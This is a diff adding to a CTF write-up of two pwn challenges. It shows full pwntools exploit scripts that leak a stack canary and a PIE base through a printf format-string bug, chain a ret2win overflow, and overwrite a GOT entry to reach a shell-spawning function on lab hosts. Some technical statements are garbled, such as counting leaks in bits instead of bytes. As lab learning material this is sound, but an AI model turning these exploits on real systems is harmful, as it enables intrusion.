@@ -197,9 +197,137 @@ The bad new is that it has all the defenses enabled D:<br />
 ![Screenshot 2025-03-21 114605](https://github.com/user-attachments/assets/7cd49870-45ba-4c3e-b6bb-a9e10a0968fe)<br />
 This challenge is about bypassing those mitigations. The very first thing that I can do is use the first interaction with the binary to leak the value of the canary. That is thanks to a format string vulnerability, the binary is printing my input with `printf(buf)`. <br />
 ![Screenshot 2025-03-21 115203](https://github.com/user-attachments/assets/c84bf550-a09c-4e81-91e2-a0ec39126b07)<br />
-The buffer is stored at -40h, which is 64 bits. So in order to leak the canary, I need to provide at least 8 times `%p`. That's because each `%p` leaks 8 bits from the stack. So in theory, right after leaking the 64 bits from the stack, the next 8 bits should be the value of the canary. 
+The buffer is stored at -40h, which is 64 bits. So in order to leak the canary, I need to provide at least 8 times `%p`. The stack canary value, always ends with `00` (and also is completely different from other addresses, it almost looks random). After some trial and error, I found that the canary is at `%13$p`. <br />
+![Screenshot 2025-03-21 150613](https://github.com/user-attachments/assets/5771f654-efdf-4522-bbbb-0a3846bb2507)<br />
+Now I know the canary, so the stack canary is bypassed. Next thing I need to do is to use the same format string exploit to leak an address of the program itself, so that I can dynamically compute the base address of the code and then also compute the address of the `get_streak` function, effectively bypassing ASLR aswell.<br />
+Now, what I know is that when a binary is PIE, it usually starts the .text section at around `0x55...`. So I decided to use the following code to leak a lot of addresses in the stack, until I find something that starts at `0x55`:
+
+    from pwn import *
+    
+    i = 1  # Gli indici di %p nelle format string iniziano tipicamente da 1
+    while i < 50:
+        p = process("./pwn107-1644307530397.pwn107")
+        p.recv()
+    
+    
+        print(f"Trying with offset {i}..")
+        # Convertiamo la stringa in bytes con .encode()
+        payload = f"%{i}$p".encode()
+        p.sendline(payload)
+    
+        p.sendline(b"thasks")
+        i += 1
+    
+        p.interactive()
+![image](https://github.com/user-attachments/assets/29388f5f-1c11-4893-a824-50701e6fa160)<br />
+
+    Execution 1: 0x5619b2200000 (base address)
+    Execution 2: 0x562544e00000 (base address)
+    Execution 3: 0x5567a9d00000 (base address)
+But the offset of the instruction remains the same every time. So I can still use the `objdump` tool to find what instruction is this: `objdump -D ./pwn107-1644307530397.pwn107 | grep 992`. Since the offset is always the same `992` should always be the offset of the same instruction. And this is the result:<br />
+![image](https://github.com/user-attachments/assets/d823593e-0ad0-4f34-88da-fba421d4f240)<br />
+Good, so now I can compute the base address, and therefore the address of the win function! The following code exploits the local binary:
+
+    from pwn import *
+    
+    elf = context.binary = ELF('./pwn107-1644307530397.pwn107')
+    
+    ip = '10.10.22.24'
+    port = 9007
+    #p = remote(ip,port)
+    p = process()
+    
+    # stack canary is at %13$p
+    p.sendline(b'%17$p %13$p')  
+    p.recvuntil(b'streak: ')
+    leaked = p.recvline().split()
+    print(leaked)
+    base = int(leaked[0], 16) - 0x992
+    canary = int(leaked[1], 16)
+    elf.address = base
+    
+    payload = b'A'*24  # found via trial and error (failing to place the canary in the right place results in a stack smashing error)
+    payload += p64(canary)
+    payload += b'A'*8 # Base address must be filled too
+    payload += p64(base + 0x6fe) # address of a ret instruction, found using `objdump`
+    payload += p64(elf.sym["get_streak"])
+    
+    p.sendline(payload)
+    p.interactive()
+![image](https://github.com/user-attachments/assets/26507b0e-4f7e-4f2d-8cb0-c0feb7d4a839)<br />
+But for some reason it doesn't exploit the remote binary.. There must be some differences on the stack values, because I tried changing the leaked address of the program from `%17$p` to `$19$p` and it worked with that. I don't really know why.., so the code that exploits the remote program is:<br />
+
+    from pwn import *
+    
+    elf = context.binary = ELF('./pwn107-1644307530397.pwn107')
+    
+    ip = '10.10.115.182'
+    port = 9007
+    p = remote(ip,port)
+    
+    p.sendline(b'%19$p %13$p')  
+    p.recvuntil(b'streak: ')
+    leaked = p.recvline().split()
+    print(leaked)
+    base = int(leaked[0], 16) - 0x992
+    canary = int(leaked[1], 16)
+    elf.address = base
+    
+    payload = b'A'*24  # found via trial and error (failing to place the canary in the right place results in a stack smashing error)
+    payload += p64(canary)
+    payload += b'A'*8 # Base address must be filled too
+    payload += p64(base + 0x6fe) # address of a ret instruction, found using `objdump`
+    payload += p64(elf.sym["get_streak"])
+    
+    p.sendline(payload)
+    p.interactive()
+
+![Screenshot 2025-03-21 171016](https://github.com/user-attachments/assets/d264a3c5-013f-4f40-b291-1b308be6e913)<br />
 
 ### Challenge 8 - pwn101
+This is how it behaves (I already tried with a format string payload xd):<br />
+![image](https://github.com/user-attachments/assets/2fa95067-65be-47e6-97e6-260203c2c565)<br />
+So it takes two user inputs, but this time only the second one is vulnerable to format string... The good new is that there's no ASLR active:<br />
+![image](https://github.com/user-attachments/assets/d1492bba-4348-41fb-aba4-2b6e7a01d80b)<br />
+Also, there's a function that spawns a shell, obviously not called by main, called "holidays":<br />
+![image](https://github.com/user-attachments/assets/99d85dbf-2e9c-41a1-b11b-71ed51b6ac9f)<br />
+Here I need to perform a GOT overwrite attack. To perform it, I first need to see at which offset the format string exploit starts to write itself in memory, I use this script:
+
+    from pwn import *
+    
+    elf = context.binary = ELF('./pwn108-1644300489260.pwn108')
+    p = process()
+    
+    p = process()
+    p.sendline(b"test")
+    p.recvuntil(b"[Your Reg No]:")
+    p.sendline(b"%p %p %p %p %p %p %p %p %p %p")
+    p.interactive()
+And this is the output:<br />
+![image](https://github.com/user-attachments/assets/8e98739e-55f4-4e95-82de-25861e3132e3)<br />
+At the stack value number 10, it starts to write hex values of `%` and `%p`. On overwriting the GOT, pwntools is a god, this simple script will overwrite thee address of the "puts" function with the address of the "holidays" function:<br />
+
+    from pwn import *
+    
+    elf = context.binary = ELF('./pwn108-1644300489260.pwn108')
+    #p = process()
+    
+    ip = "10.10.115.182"
+    port = 9008
+    
+    p = remote(ip,port)
+
+    p.sendline(b"something")
+    p.recvuntil(b"[Your Reg No]:")
+    
+    offset = 10  # Se il test di format string mostra un valore diverso, cambialo
+    payload = fmtstr_payload(offset, {elf.got['puts']: elf.sym['holidays']})
+    
+    p.sendline(payload)
+    
+    p.interactive()
+
+![image](https://github.com/user-attachments/assets/cc63b353-475b-4f43-9da1-e14e1656275e)<br />
 
 ### Challenge 8 - pwn101
 
